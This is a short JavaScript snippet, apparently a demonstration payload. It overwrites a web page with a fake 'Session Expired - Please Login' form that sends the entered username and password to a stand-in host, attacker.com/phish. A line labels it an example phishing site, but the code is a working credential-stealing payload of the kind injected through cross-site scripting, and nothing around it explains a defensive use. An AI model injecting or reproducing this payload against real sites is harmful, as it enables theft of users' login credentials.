document.body.innerHTML = `
    <form action="https://attacker.com/phish" method="POST">
      <h3>WARNING! This is example phishing site</h3>
      <h2>Session Expired - Please Login</h2>
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  `;
